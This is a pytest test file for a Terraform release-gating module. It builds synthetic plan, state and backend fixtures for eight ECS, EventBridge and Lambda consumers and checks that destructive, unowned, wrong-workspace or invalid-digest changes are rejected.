from __future__ import annotations

import importlib.util
import json
import re
import sys
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]
MODULE_PATH = ROOT / "infra" / "terraform" / "image_release_context.py"
PLAN_SCRIPT = ROOT / "infra" / "terraform" / "plan_image_release.sh"
APPLY_SCRIPT = ROOT / "infra" / "terraform" / "apply_image_release_plan.sh"
COMPOSED_GUARD = ROOT / "infra" / "deploy" / "terraform_runtime_guard.sh"


def _load_module() -> Any:
    spec = importlib.util.spec_from_file_location(
        "image_release_context_under_test",
        MODULE_PATH,
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


CONTEXT = _load_module()
REGISTRY = CONTEXT.load_consumer_registry()
LEGACY_TIKTOK_IMAGE = (
    "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
    f"teamagent-dev-tiktok-acquire@sha256:eb975be{'0' * 57}"
)


def _task_arn(consumer: dict[str, Any], revision: int = 1) -> str:
    return (
        "arn:aws:ecs:ap-northeast-1:718959508629:task-definition/"
        f"{consumer['ecs_family']}:{revision}"
    )


def _image(
    consumer: dict[str, Any],
    index: int,
    *,
    pre_media_cutover: bool = True,
) -> str:
    if pre_media_cutover and consumer["consumer_id"] == "tiktok_acquire":
        return LEGACY_TIKTOK_IMAGE
    return (
        "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
        f"{consumer['release_repository']}@sha256:{format(index + 1, 'x') * 64}"
    )


def _task_volume(
    name: str,
    *,
    efs_volume_configuration: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    return {
        "configure_at_launch": False,
        "docker_volume_configuration": [],
        "efs_volume_configuration": (
            [] if efs_volume_configuration is None else efs_volume_configuration
        ),
        "fsx_windows_file_server_volume_configuration": [],
        "host_path": None,
        "name": name,
    }


def _task_volumes(consumer: dict[str, Any]) -> list[dict[str, Any]]:
    if consumer["consumer_id"] != "openclaw":
        return [_task_volume("runtime-tmp")]
    return [
        _task_volume("tmp"),
        _task_volume(
            "state",
            efs_volume_configuration=[
                {
                    "authorization_config": [
                        {
                            "access_point_id": "fsap-0123456789abcdef0",  # gitleaks:allow 合成フィクスチャID
                            "iam": "ENABLED",
                        }
                    ],
                    "file_system_id": "fs-0123456789abcdef0",
                    "root_directory": "/",
                    "transit_encryption": "ENABLED",
                    "transit_encryption_port": None,
                }
            ],
        ),
    ]


def _task_attributes(
    consumer: dict[str, Any],
    index: int,
    *,
    pre_media_cutover: bool = True,
) -> dict[str, Any]:
    return {
        "arn": _task_arn(consumer),
        "id": _task_arn(consumer),
        "family": consumer["ecs_family"],
        "task_role_arn": (
            f"arn:aws:iam::718959508629:role/teamagent-{consumer['ecs_family']}-task"
        ),
        "execution_role_arn": (
            f"arn:aws:iam::718959508629:role/teamagent-{consumer['ecs_family']}-execution"
        ),
        "network_mode": "awsvpc",
        "cpu": "256",
        "memory": "512",
        "volume": _task_volumes(consumer),
        "container_definitions": json.dumps(
            [
                {
                    "name": consumer["container_name"],
                    "image": _image(
                        consumer,
                        index,
                        pre_media_cutover=pre_media_cutover,
                    ),
                    "command": ["python", "-m", "worker"],
                    "entryPoint": [],
                    "environment": [
                        {"name": "Z_LAST", "value": "last"},
                        {"value": "first", "name": "A_FIRST"},
                    ],
                    "secrets": [],
                    "user": "1000",
                    "privileged": False,
                    "readonlyRootFilesystem": True,
                    "linuxParameters": {"initProcessEnabled": True},
                    "mountPoints": [],
                    "logConfiguration": {
                        "logDriver": "awslogs",
                        "options": {
                            "awslogs-region": "ap-northeast-1",
                            "awslogs-stream-prefix": consumer["consumer_id"],
                        },
                    },
                }
            ],
            separators=(",", ":"),
        ),
    }


def _task_definition(
    consumer: dict[str, Any],
    index: int,
    *,
    pre_media_cutover: bool = True,
) -> dict[str, Any]:
    attributes = _task_attributes(
        consumer,
        index,
        pre_media_cutover=pre_media_cutover,
    )
    containers = json.loads(attributes["container_definitions"])
    for container in containers:
        container["environment"] = sorted(
            container["environment"],
            key=lambda entry: entry["name"],
        )
    return {
        "container_definitions": containers,
        "cpu": attributes["cpu"],
        "execution_role_arn": attributes["execution_role_arn"],
        "memory": attributes["memory"],
        "network_mode": attributes["network_mode"],
        "task_role_arn": attributes["task_role_arn"],
        "volumes": attributes["volume"],
    }


def _state_resource(
    address: str,
    resource_type: str,
    attributes: dict[str, Any],
) -> dict[str, Any]:
    base = re.sub(r"\[0\]$", "", address)
    _, name = base.split(".", 1)
    instance: dict[str, Any] = {
        "schema_version": 1,
        "attributes": attributes,
    }
    if address.endswith("[0]"):
        instance["index_key"] = 0
    return {
        "mode": "managed",
        "type": resource_type,
        "name": name,
        "instances": [instance],
    }


def _consumer_activation(
    consumer: dict[str, Any],
) -> tuple[list[tuple[str, str, dict[str, Any]]], dict[str, Any], str]:
    consumer_id = consumer["consumer_id"]
    activator = consumer["activator"]
    task_arn = _task_arn(consumer)
    if activator["type"] == "ecs_service":
        address = f"aws_ecs_service.{consumer_id}" + (
            "[0]" if consumer_id in {"connect_web", "openclaw"} else ""
        )
        attributes = {
            "name": activator["identity"],
            "desired_count": 1,
            "task_definition": task_arn,
        }
        return (
            [(address, "aws_ecs_service", attributes)],
            {"desired_count": 1, "task_definition_arn": task_arn},
            address,
        )
    if activator["type"] == "eventbridge_rule_ecs_target":
        suffix = {
            "canary": "canary_hourly",
            "ingest": "ingest_weekly",
            "morning_digest": "morning_digest_weekday",
        }[consumer_id]
        rule_address = f"aws_cloudwatch_event_rule.{suffix}[0]"
        target_address = f"aws_cloudwatch_event_target.{suffix}[0]"
        state = "ENABLED" if consumer_id == "morning_digest" else "DISABLED"
        return (
            [
                (
                    rule_address,
                    "aws_cloudwatch_event_rule",
                    {"name": activator["identity"], "state": state},
                ),
                (
                    target_address,
                    "aws_cloudwatch_event_target",
                    {
                        "rule": activator["identity"],
                        "ecs_target": [{"task_definition_arn": task_arn}],
                    },
                ),
            ],
            {"state": state, "task_definition_arn": task_arn},
            target_address,
        )
    suffix = "x_dispatch" if consumer_id == "x_buzz_worker" else "tiktok_dispatch"
    function_address = f"aws_lambda_function.{suffix}[0]"
    mapping_address = f"aws_lambda_event_source_mapping.{suffix}[0]"
    return (
        [
            (
                function_address,
                "aws_lambda_function",
                {
                    "function_name": activator["identity"],
                    "environment": [{"variables": {"TASKDEF_ARN": task_arn}}],
                },
            ),
            (
                mapping_address,
                "aws_lambda_event_source_mapping",
                {"function_name": activator["identity"], "enabled": True},
            ),
        ],
        {
            "event_source_mapping_enabled": True,
            "task_definition_arn": task_arn,
        },
        function_address,
    )


def _consumer_manifest(*, pre_media_cutover: bool = True) -> dict[str, Any]:
    consumers: list[dict[str, Any]] = []
    for index, consumer in enumerate(REGISTRY["consumers"]):
        _, activation, _ = _consumer_activation(consumer)
        snapshot = {
            "image": _image(
                consumer,
                index,
                pre_media_cutover=pre_media_cutover,
            ),
            "task_definition_arn": _task_arn(consumer),
            "task_definition": _task_definition(
                consumer,
                index,
                pre_media_cutover=pre_media_cutover,
            ),
            "activation": activation,
        }
        consumers.append(
            {
                **{
                    key: consumer[key]
                    for key in (
                        "consumer_id",
                        "terraform_task_definition_address",
                        "ecs_family",
                        "container_name",
                        "activator",
                        "release_repository",
                        "receipt",
                    )
                },
                "live": json.loads(json.dumps(snapshot)),
                "before": json.loads(json.dumps(snapshot)),
                "after": json.loads(json.dumps(snapshot)),
            }
        )
    return {
        "schema_version": 1,
        "registry_sha256": CONTEXT.consumer_registry_sha256(),
        "mode": "no-image-transition",
        "consumers": consumers,
    }


def _manifest_consumer(plan: dict[str, Any], consumer_id: str) -> dict[str, Any]:
    manifest = plan["variables"]["image_deployment_consumer_manifest"]["value"]
    return next(
        consumer for consumer in manifest["consumers"] if consumer["consumer_id"] == consumer_id
    )


def _resource_change(plan: dict[str, Any], address: str) -> dict[str, Any]:
    return next(change for change in plan["resource_changes"] if change["address"] == address)


def _configuration_resource(plan: dict[str, Any], address: str) -> dict[str, Any]:
    return next(
        resource
        for resource in plan["configuration"]["root_module"]["resources"]
        if resource["address"] == address
    )


def _backend() -> dict[str, Any]:
    return {
        "backend": {
            "type": "s3",
            "config": {
                "bucket": "teamagent-tfstate-718959508629",
                "key": "teamagent/terraform.tfstate",
                "region": "ap-northeast-1",
                "dynamodb_table": "teamagent-tflock",
                "encrypt": True,
            },
        }
    }


def _state(*, pre_media_cutover: bool = True) -> dict[str, Any]:
    resources = [
        {
            "mode": "managed",
            "type": "terraform_data",
            "name": "production_image_release_gate",
            "instances": [{"schema_version": 0, "attributes": {}}],
        }
    ]
    for index, consumer in enumerate(REGISTRY["consumers"]):
        resources.append(
            _state_resource(
                consumer["terraform_task_definition_address"],
                "aws_ecs_task_definition",
                _task_attributes(
                    consumer,
                    index,
                    pre_media_cutover=pre_media_cutover,
                ),
            )
        )
    for consumer in REGISTRY["consumers"]:
        activation_resources, _, _ = _consumer_activation(consumer)
        resources.extend(
            _state_resource(address, resource_type, attributes)
            for address, resource_type, attributes in activation_resources
        )
    return {
        "version": 4,
        "terraform_version": "1.12.2",
        "serial": 1234,
        "lineage": "11111111-1111-4111-8111-111111111111",
        "resources": resources,
    }


def _plan(*, pre_media_cutover: bool = True) -> dict[str, Any]:
    manifest = _consumer_manifest(pre_media_cutover=pre_media_cutover)
    manifest_consumers = {consumer["consumer_id"]: consumer for consumer in manifest["consumers"]}
    resources: list[dict[str, Any]] = [{"address": "terraform_data.production_image_release_gate"}]
    changes: list[dict[str, Any]] = [
        {
            "address": "terraform_data.production_image_release_gate",
            "mode": "managed",
            "change": {
                "actions": ["delete", "create"],
                "before": {},
                "after": {"input": {"release_channels": {}}},
            },
        }
    ]
    for index, consumer in enumerate(REGISTRY["consumers"]):
        address = consumer["terraform_task_definition_address"]
        configuration_address = re.sub(r"\[0\]$", "", address)
        resources.append({"address": configuration_address})
        attributes = _task_attributes(
            consumer,
            index,
            pre_media_cutover=pre_media_cutover,
        )
        changes.append(
            {
                "address": address,
                "mode": "managed",
                "change": {
                    "actions": ["no-op"],
                    "before": json.loads(json.dumps(attributes)),
                    "after": json.loads(json.dumps(attributes)),
                },
            }
        )
    for consumer in REGISTRY["consumers"]:
        activation_resources, _, pointer_address = _consumer_activation(consumer)
        for address, _, attributes in activation_resources:
            configuration_address = re.sub(r"\[0\]$", "", address)
            configuration: dict[str, Any] = {"address": configuration_address}
            if address == pointer_address:
                expression_name = {
                    "ecs_service": "task_definition",
                    "eventbridge_rule_ecs_target": "ecs_target",
                    "lambda_taskdef_arn_environment": "environment",
                }[consumer["activator"]["type"]]
                configuration["expressions"] = {
                    expression_name: {
                        "references": [f"{consumer['terraform_task_definition_address']}.arn"]
                    }
                }
            resources.append(configuration)
            changes.append(
                {
                    "address": address,
                    "mode": "managed",
                    "change": {
                        "actions": ["no-op"],
                        "before": json.loads(json.dumps(attributes)),
                        "after": json.loads(json.dumps(attributes)),
                    },
                }
            )
    return {
        "complete": True,
        "applyable": True,
        "errored": False,
        "variables": {
            "mcp_image": {"value": manifest_consumers["mcp"]["live"]["image"]},
            "openclaw_image": {"value": manifest_consumers["openclaw"]["live"]["image"]},
            "x_buzz_image": {"value": manifest_consumers["x_buzz_worker"]["live"]["image"]},
            "media_worker_image": {
                "value": (
                    ""
                    if pre_media_cutover
                    else manifest_consumers["tiktok_acquire"]["live"]["image"]
                )
            },
            "tiktok_acquire_image": {"value": ""},
            "enable_connect_web": {"value": True},
            "enable_canary_health": {"value": True},
            "enable_ingest_schedule": {"value": True},
            "enable_morning_digest": {"value": True},
            "enable_x_research": {"value": True},
            "enable_media_worker": {"value": True},
            "enable_tiktok_acquire": {"value": True},
            "image_deployment_consumer_manifest": {"value": manifest},
            "image_release_receipt_catalog": {"value": {}},
            "image_release_consumer_receipt_bindings": {"value": {}},
        },
        "configuration": {
            "root_module": {
                "resources": resources,
            }
        },
        "resource_changes": changes,
    }


def _state_instance_address(resource: dict[str, Any]) -> str:
    base = f"{resource['type']}.{resource['name']}"
    instance = resource["instances"][0]
    index_key = instance.get("index_key")
    return base if index_key is None else f"{base}[{index_key}]"


def _consumer_resource_addresses(consumer: dict[str, Any]) -> set[str]:
    activation_resources, _, _ = _consumer_activation(consumer)
    return {
        consumer["terraform_task_definition_address"],
        *(address for address, _, _ in activation_resources),
    }


def _remove_consumer_from_state(
    state: dict[str, Any],
    consumer: dict[str, Any],
) -> None:
    addresses = _consumer_resource_addresses(consumer)
    state["resources"] = [
        resource
        for resource in state["resources"]
        if _state_instance_address(resource) not in addresses
    ]


def _make_consumer_already_absent(
    plan: dict[str, Any],
    state: dict[str, Any],
    consumer_id: str,
) -> None:
    consumer = next(item for item in REGISTRY["consumers"] if item["consumer_id"] == consumer_id)
    manifest_consumer = _manifest_consumer(plan, consumer_id)
    for phase in ("live", "before", "after"):
        manifest_consumer[phase] = {"absent": True}
    addresses = _consumer_resource_addresses(consumer)
    _remove_consumer_from_state(state, consumer)
    plan["resource_changes"] = [
        change for change in plan["resource_changes"] if change["address"] not in addresses
    ]
    if consumer_id == "x_buzz_worker":
        plan["variables"]["enable_x_research"]["value"] = False
        plan["variables"]["x_buzz_image"]["value"] = ""
    elif consumer_id == "tiktok_acquire":
        plan["variables"]["enable_media_worker"]["value"] = False
        plan["variables"]["enable_tiktok_acquire"]["value"] = False
        plan["variables"]["media_worker_image"]["value"] = ""
        plan["variables"]["tiktok_acquire_image"]["value"] = ""


def _make_connect_web_absent_to_present(
    plan: dict[str, Any],
    state: dict[str, Any],
) -> None:
    registry_consumer = next(
        item for item in REGISTRY["consumers"] if item["consumer_id"] == "connect_web"
    )
    consumer = _manifest_consumer(plan, "connect_web")
    consumer["live"] = {"absent": True}
    consumer["before"] = {"absent": True}
    address = consumer["terraform_task_definition_address"]
    consumer["after"]["task_definition_arn"] = address
    consumer["after"]["activation"]["task_definition_arn"] = address
    plan["variables"]["image_deployment_consumer_manifest"]["value"]["mode"] = "receipt-required"
    _remove_consumer_from_state(state, registry_consumer)

    task_change = _resource_change(plan, address)["change"]
    task_change["actions"] = ["create"]
    task_change["before"] = None
    task_change["after"]["arn"] = None
    task_change["after"]["id"] = None

    service_change = _resource_change(plan, "aws_ecs_service.connect_web[0]")["change"]
    service_change["actions"] = ["create"]
    service_change["before"] = None
    service_change["after"]["task_definition"] = None


def test_context_binds_exact_backend_workspace_state_and_plan_ownership() -> None:
    value = CONTEXT.build_context(
        plan=_plan(),
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["backend"] == CONTEXT.EXPECTED_BACKEND
    assert value["workspace"] == "default"
    assert value["state"]["lineage"] == _state()["lineage"]
    assert value["state"]["serial"] == 1234
    assert value["state"]["managed_address_count"] == 22
    assert value["consumer_manifest"]["mode"] == "no-image-transition"
    assert value["plan"] == {
        "complete": True,
        "applyable": True,
        "errored": False,
        "managed_change_count": 22,
        "address_ownership_sha256": value["plan"]["address_ownership_sha256"],
        "runtime_images_sha256": value["plan"]["runtime_images_sha256"],
        "consumer_manifest_sha256": value["plan"]["consumer_manifest_sha256"],
        "consumer_count": 8,
        "consumer_comparison_sha256": value["plan"]["consumer_comparison_sha256"],
        "release_evidence_binding_sha256": value["plan"]["release_evidence_binding_sha256"],
        "delete_change_count": 0,
        "replace_change_count": 0,
        "transition_sha256": value["plan"]["transition_sha256"],
    }
    assert len(CONTEXT.context_sha256(value)) == 64


def test_context_allows_only_exact_unowned_existing_log_import() -> None:
    plan = _plan()
    address = "aws_cloudwatch_log_group.ecs_containerinsights_teamagent"
    import_id = "/aws/ecs/containerinsights/teamagent-dev/performance"
    plan["configuration"]["root_module"]["resources"].append({"address": address})
    plan["resource_changes"].append(
        {
            "address": address,
            "mode": "managed",
            "change": {
                "actions": ["update"],
                "importing": {"id": import_id},
            },
        }
    )

    value = CONTEXT.build_context(
        plan=plan,
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["plan"]["managed_change_count"] == 23
    assert len(value["plan"]["address_ownership_sha256"]) == 64

    wrong_id = _plan()
    wrong_id["configuration"]["root_module"]["resources"].append({"address": address})
    wrong_id["resource_changes"].append(
        {
            "address": address,
            "mode": "managed",
            "change": {
                "actions": ["update"],
                "importing": {"id": f"{import_id}-wrong"},
            },
        }
    )
    with pytest.raises(CONTEXT.ContextError, match="exact existing-log"):
        CONTEXT.build_context(
            plan=wrong_id,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )

    destructive = plan.copy()
    destructive["configuration"] = {
        "root_module": {"resources": list(plan["configuration"]["root_module"]["resources"])}
    }
    destructive["resource_changes"] = [
        {
            **change,
            "change": dict(change["change"]),
        }
        for change in plan["resource_changes"]
    ]
    destructive["resource_changes"][-1]["change"]["actions"] = [
        "delete",
        "create",
    ]
    with pytest.raises(CONTEXT.ContextError, match="destructive"):
        CONTEXT.build_context(
            plan=destructive,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_context_classifies_saved_plan_delete_and_replace_actions() -> None:
    replacement = _plan()
    replacement["resource_changes"][1]["change"]["actions"] = ["delete", "create"]
    replacement_context = CONTEXT.build_context(
        plan=replacement,
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )
    assert replacement_context["plan"]["delete_change_count"] == 0
    assert replacement_context["plan"]["replace_change_count"] == 1

    deletion = _plan()
    deletion["resource_changes"][1]["change"]["actions"] = ["delete"]
    deletion_context = CONTEXT.build_context(
        plan=deletion,
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )
    assert deletion_context["plan"]["delete_change_count"] == 1
    assert deletion_context["plan"]["replace_change_count"] == 0
    assert (
        deletion_context["plan"]["transition_sha256"]
        != replacement_context["plan"]["transition_sha256"]
    )


@pytest.mark.parametrize("variable_name", ["mcp_image", "openclaw_image"])
def test_context_rejects_empty_managed_runtime_images(variable_name: str) -> None:
    plan = _plan()
    plan["variables"][variable_name]["value"] = ""

    with pytest.raises(CONTEXT.ContextError, match="nonempty release digest"):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_context_binds_only_the_generic_effective_media_worker_digest() -> None:
    plan = _plan(pre_media_cutover=False)
    media_image = plan["variables"]["media_worker_image"]["value"]
    plan["variables"]["enable_media_worker"]["value"] = True
    plan["variables"]["enable_tiktok_acquire"]["value"] = True
    plan["variables"]["media_worker_image"]["value"] = media_image

    value = CONTEXT.build_context(
        plan=plan,
        state=_state(pre_media_cutover=False),
        backend_metadata=_backend(),
        workspace="default",
    )

    assert len(value["plan"]["runtime_images_sha256"]) == 64

    plan["variables"]["media_worker_image"]["value"] = (
        "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
        f"teamagent-dev-tiktok-acquire@sha256:{'c' * 64}"
    )
    with pytest.raises(
        CONTEXT.ContextError,
        match="runtime image digest is invalid: media_worker_image",
    ):
        CONTEXT.build_context(
            plan=plan,
            state=_state(pre_media_cutover=False),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_runtime_binding_binds_and_type_checks_all_consumer_inputs() -> None:
    plan = _plan()

    binding = CONTEXT._runtime_image_binding(plan)

    assert set(binding["images"]) == {
        "mcp_image",
        "openclaw_image",
        "x_buzz_image",
        "media_worker_image",
        "tiktok_acquire_image",
    }
    assert set(binding["enable_flags"]) == {
        "enable_connect_web",
        "enable_canary_health",
        "enable_ingest_schedule",
        "enable_morning_digest",
        "enable_x_research",
        "enable_media_worker",
        "enable_tiktok_acquire",
    }

    disabled = _plan()
    disabled["variables"]["enable_x_research"]["value"] = False
    disabled["variables"]["x_buzz_image"]["value"] = ""
    assert CONTEXT._runtime_image_binding(disabled) != binding

    invalid_flag = _plan()
    invalid_flag["variables"]["enable_x_research"]["value"] = "false"
    with pytest.raises(CONTEXT.ContextError, match="enable variable is invalid"):
        CONTEXT._runtime_image_binding(invalid_flag)

    invalid_image = _plan()
    invalid_image["variables"]["x_buzz_image"]["value"] = "latest"
    with pytest.raises(CONTEXT.ContextError, match="x_buzz_image"):
        CONTEXT._runtime_image_binding(invalid_image)


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        (lambda plan, state, backend: plan.update(complete=False), "incomplete"),
        (lambda plan, state, backend: plan.update(applyable=False), "not applyable"),
        (
            lambda plan, state, backend: plan["resource_changes"][1]["change"].update(
                importing={"id": "hostile-import"}
            ),
            "exact existing-log",
        ),
        (
            lambda plan, state, backend: state.update(serial=-1),
            "state serial",
        ),
        (
            lambda plan, state, backend: backend["backend"]["config"].update(
                key="other/terraform.tfstate"
            ),
            "backend identity",
        ),
    ],
)
def test_context_rejects_incomplete_imported_or_wrong_state(
    mutation: Any,
    message: str,
) -> None:
    plan = _plan()
    state = _state()
    backend = _backend()
    mutation(plan, state, backend)

    with pytest.raises(CONTEXT.ContextError, match=message):
        CONTEXT.build_context(
            plan=plan,
            state=state,
            backend_metadata=backend,
            workspace="default",
        )


def test_context_rejects_nondefault_workspace_and_unowned_address() -> None:
    with pytest.raises(CONTEXT.ContextError, match="workspace"):
        CONTEXT.build_context(
            plan=_plan(),
            state=_state(),
            backend_metadata=_backend(),
            workspace="hostile",
        )

    plan = _plan()
    plan["resource_changes"][1] = {
        "address": "aws_ecs_task_definition.not_in_state_or_config",
        "mode": "managed",
        "change": {"actions": ["update"]},
    }
    with pytest.raises(CONTEXT.ContextError, match="not owned by the bound state"):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_raw_state_binding_preserves_count_for_each_and_module_addresses() -> None:
    state = {
        "version": 4,
        "serial": 1,
        "lineage": "11111111-1111-4111-8111-111111111111",
        "resources": [
            {
                "mode": "managed",
                "type": "terraform_data",
                "name": "production_image_release_gate",
                "instances": [{"schema_version": 0, "attributes": {}}],
            },
            {
                "mode": "managed",
                "type": "aws_ecs_task_definition",
                "name": "mcp",
                "instances": [{"schema_version": 1, "attributes": {}}],
            },
            {
                "module": 'module.workers["media"]',
                "mode": "managed",
                "type": "aws_ecs_task_definition",
                "name": "worker",
                "instances": [
                    {"index_key": 0, "schema_version": 1, "attributes": {}},
                    {"index_key": "blue", "schema_version": 1, "attributes": {}},
                ],
            },
            {
                "mode": "data",
                "type": "aws_caller_identity",
                "name": "current",
                "instances": [{"schema_version": 0, "attributes": {}}],
            },
        ],
    }

    binding = CONTEXT._state_binding(state)

    assert binding["managed_address_count"] == 4
    assert binding["_addresses"] == [
        "aws_ecs_task_definition.mcp",
        'module.workers["media"].aws_ecs_task_definition.worker["blue"]',
        'module.workers["media"].aws_ecs_task_definition.worker[0]',
        "terraform_data.production_image_release_gate",
    ]


def test_consumer_manifest_derives_no_image_transition_from_exact_eight() -> None:
    manifest = CONTEXT.validate_consumer_manifest(_consumer_manifest())

    assert manifest["mode"] == "no-image-transition"
    assert len(manifest["consumers"]) == 8
    assert manifest["registry_sha256"] == CONTEXT.consumer_registry_sha256()

    missing = _consumer_manifest()
    missing["consumers"].pop()
    with pytest.raises(CONTEXT.ContextError, match="exactly eight"):
        CONTEXT.validate_consumer_manifest(missing)

    wrong_hash = _consumer_manifest()
    wrong_hash["registry_sha256"] = "0" * 64
    with pytest.raises(CONTEXT.ContextError, match="registry hash"):
        CONTEXT.validate_consumer_manifest(wrong_hash)


def test_sync_consumer_manifest_binds_the_complete_eight_consumer_state() -> None:
    state = _state()
    plan = _plan()

    manifest = CONTEXT.build_sync_consumer_manifest(state)

    assert manifest == CONTEXT.validate_consumer_manifest(_consumer_manifest())
    assert plan["variables"]["image_deployment_consumer_manifest"]["value"] == manifest
    assert manifest["mode"] == "no-image-transition"
    assert len(manifest["consumers"]) == 8
    assert all(
        consumer["live"] == consumer["before"] == consumer["after"]
        for consumer in manifest["consumers"]
    )
    raw_volumes = {
        _state_instance_address(resource): (resource["instances"][0]["attributes"]["volume"])
        for resource in state["resources"]
        if resource["type"] == "aws_ecs_task_definition"
        and "volumes" not in resource["instances"][0]["attributes"]
    }
    assert len(raw_volumes) == 8
    assert all(
        consumer["live"]["task_definition"]["volumes"]
        == raw_volumes[consumer["terraform_task_definition_address"]]
        for consumer in manifest["consumers"]
    )
    assert all(raw_volumes.values())

    consumers = {consumer["consumer_id"]: consumer for consumer in manifest["consumers"]}
    mcp_consumers = {
        "mcp",
        "connect_web",
        "canary",
        "ingest",
        "morning_digest",
        "x_buzz_worker",
    }
    assert {
        consumer_id
        for consumer_id, consumer in consumers.items()
        if consumer["release_repository"] == "teamagent-mcp"
    } == mcp_consumers
    mcp_images = {
        consumer_id: consumers[consumer_id]["live"]["image"] for consumer_id in mcp_consumers
    }
    assert {image.split("@", 1)[0] for image in mcp_images.values()} == {
        "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp"
    }
    assert len(set(mcp_images.values())) == len(mcp_images)
    assert consumers["tiktok_acquire"]["live"]["image"] == LEGACY_TIKTOK_IMAGE
    assert consumers["canary"]["live"]["activation"]["state"] == "DISABLED"
    assert consumers["ingest"]["live"]["activation"]["state"] == "DISABLED"
    assert plan["variables"]["mcp_image"]["value"] == consumers["mcp"]["live"]["image"]
    assert plan["variables"]["x_buzz_image"]["value"] == consumers["x_buzz_worker"]["live"]["image"]
    assert plan["variables"]["openclaw_image"]["value"] == consumers["openclaw"]["live"]["image"]
    assert plan["variables"]["media_worker_image"]["value"] == ""
    assert plan["variables"]["tiktok_acquire_image"]["value"] == ""
    assert plan["variables"]["enable_canary_health"]["value"] is True
    assert plan["variables"]["enable_ingest_schedule"]["value"] is True
    assert plan["variables"]["enable_media_worker"]["value"] is True
    assert plan["variables"]["enable_tiktok_acquire"]["value"] is True

    drifted_state = _state()
    mcp_service = next(
        resource
        for resource in drifted_state["resources"]
        if resource["type"] == "aws_ecs_service" and resource["name"] == "mcp"
    )
    mcp_service["instances"][0]["attributes"]["task_definition"] = _task_arn(
        REGISTRY["consumers"][0],
        revision=2,
    )
    with pytest.raises(
        CONTEXT.ContextError,
        match="state activation points at another task definition",
    ):
        CONTEXT.build_sync_consumer_manifest(drifted_state)


def test_consumer_manifest_allows_only_unchanged_pre_cutover_tiktok_legacy_row() -> None:
    manifest = _consumer_manifest()
    tiktok = next(
        consumer
        for consumer in manifest["consumers"]
        if consumer["consumer_id"] == "tiktok_acquire"
    )
    legacy_image = LEGACY_TIKTOK_IMAGE
    for phase in ("live", "before", "after"):
        tiktok[phase]["image"] = legacy_image
        tiktok[phase]["task_definition"]["container_definitions"][0]["image"] = legacy_image

    validated = CONTEXT.validate_consumer_manifest(manifest)

    validated_tiktok = next(
        consumer
        for consumer in validated["consumers"]
        if consumer["consumer_id"] == "tiktok_acquire"
    )
    assert validated["mode"] == "no-image-transition"
    assert {validated_tiktok[phase]["image"] for phase in ("live", "before", "after")} == {
        legacy_image
    }

    changed = json.loads(json.dumps(manifest))
    changed_tiktok = next(
        consumer for consumer in changed["consumers"] if consumer["consumer_id"] == "tiktok_acquire"
    )
    changed_tiktok["after"]["task_definition_arn"] = "aws_ecs_task_definition.tiktok_acquire[0]"
    changed["mode"] = "receipt-required"
    with pytest.raises(CONTEXT.ContextError, match="anchored pre-cutover"):
        CONTEXT.validate_consumer_manifest(changed)

    other_consumer = json.loads(json.dumps(manifest))
    mcp = next(
        consumer for consumer in other_consumer["consumers"] if consumer["consumer_id"] == "mcp"
    )
    for phase in ("live", "before", "after"):
        mcp[phase]["image"] = legacy_image
        mcp[phase]["task_definition"]["container_definitions"][0]["image"] = legacy_image
    with pytest.raises(CONTEXT.ContextError, match="anchored pre-cutover"):
        CONTEXT.validate_consumer_manifest(other_consumer)


def test_consumer_manifest_canonicalizes_only_the_exact_absent_sentinel() -> None:
    manifest = _consumer_manifest()
    consumer = next(
        item for item in manifest["consumers"] if item["consumer_id"] == "x_buzz_worker"
    )
    for phase in ("live", "before", "after"):
        consumer[phase] = {"absent": True}

    validated = CONTEXT.validate_consumer_manifest(manifest)

    assert validated["mode"] == "no-image-transition"
    assert all(
        phase == {"absent": True} and CONTEXT.consumer_snapshot_is_absent(phase)
        for phase in (
            validated["consumers"][6]["live"],
            validated["consumers"][6]["before"],
            validated["consumers"][6]["after"],
        )
    )

    malformed = json.loads(json.dumps(manifest))
    malformed["consumers"][6]["after"] = {"absent": False}
    with pytest.raises(CONTEXT.ContextError, match="schema mismatch"):
        CONTEXT.validate_consumer_manifest(malformed)


def test_consumer_manifest_requires_receipt_for_absent_to_present() -> None:
    manifest = _consumer_manifest(pre_media_cutover=False)
    consumer = next(item for item in manifest["consumers"] if item["consumer_id"] == "connect_web")
    consumer["live"] = {"absent": True}
    consumer["before"] = {"absent": True}
    manifest["mode"] = "receipt-required"

    validated = CONTEXT.validate_consumer_manifest(manifest)

    assert validated["mode"] == "receipt-required"


def test_consumer_manifest_rejects_present_to_absent_decommission() -> None:
    manifest = _consumer_manifest(pre_media_cutover=False)
    consumer = next(item for item in manifest["consumers"] if item["consumer_id"] == "connect_web")
    consumer["after"] = {"absent": True}
    manifest["mode"] = "receipt-required"

    with pytest.raises(CONTEXT.ContextError, match="decommission"):
        CONTEXT.validate_consumer_manifest(manifest)


def test_registry_sha256_command_emits_external_data_source_shape(
    capsys: pytest.CaptureFixture[str],
) -> None:
    assert CONTEXT.main(["registry-sha256"]) == 0

    assert json.loads(capsys.readouterr().out) == {"sha256": CONTEXT.consumer_registry_sha256()}


def test_validate_consumer_manifest_command_emits_canonical_manifest(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    manifest = _consumer_manifest()
    manifest_path = tmp_path / "consumer-manifest.json"
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

    assert (
        CONTEXT.main(
            [
                "validate-consumer-manifest",
                "--manifest",
                str(manifest_path),
            ]
        )
        == 0
    )

